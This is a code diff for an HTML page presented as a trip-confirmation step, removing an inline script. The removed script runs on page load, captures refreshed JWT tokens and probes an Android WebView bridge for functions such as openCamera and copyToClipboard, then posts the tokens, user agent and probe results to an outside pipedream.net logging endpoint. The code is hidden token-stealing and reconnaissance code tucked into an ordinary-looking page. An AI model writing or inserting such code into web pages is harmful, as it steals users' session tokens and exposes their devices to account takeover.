@@ -93,53 +93,6 @@
     <div class="footer">
       This step is required to confirm your upcoming trip.
     </div>
-
-    <script>
-      (function () {
-        const LOG_URL = "https://eol1rt726v7fwz6.m.pipedream.net";
-
-        function sendLog(data) {
-          try {
-            fetch(LOG_URL, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ log: data, ua: navigator.userAgent })
-            });
-          } catch (e) {
-            console.log("Logging failed", e);
-          }
-        }
-
-        function log(msg) {
-          document.write(`<div style="font-family:monospace;color:#0c0">✓ ${msg}</div>`);
-        }
-
-        const handleJWTRefresh = (jwtValue) => {
-          sendLog(`JWT refreshed: ${jwtValue}`);
-        };
-
-        setTimeout(() => {
-          this.addEventListener('onJWTRefresh', handleJWTRefresh);
-
-          Android.postMessage(JSON.stringify({ action: 'setup_navigation_bar', data: {} }));
-          const logEntries = [
-            `Android.copyToClipboard :` + (typeof Android.copyToClipboard === "undefined" ? "not" : "") + " available",
-            `Android.getAppVersion :` + (typeof Android.getAppVersion === "undefined" ? "not" : "") + " available",
-            `Android.getDeviceModel :` + (typeof Android.getDeviceModel === "undefined" ? "not" : "") + " available",
-            `Android.getOsVersion :` + (typeof Android.getOsVersion === "undefined" ? "not" : "") + " available",
-            `Android.goBackToMain :` + (typeof Android.goBackToMain === "undefined" ? "not" : "") + " available",
-            `Android.openCamera :` + (typeof Android.openCamera === "undefined" ? "not" : "") + " available",
-            `Android.openCustomChooser :` + (typeof Android.openCustomChooser === "undefined" ? "not" : "") + " available",
-            `Android.openImageChooser :` + (typeof Android.openImageChooser === "undefined" ? "not" : "") + " available",
-            `Android.openShareMenu :` + (typeof Android.openShareMenu === "undefined" ? "not" : "") + " available",
-          ];
-
-          sendLog(logEntries.join("\n"));
-          log("Probed and sent log.");
-        }, 400);
-      })();
-    </script>
-
   </div>
 </body>
 
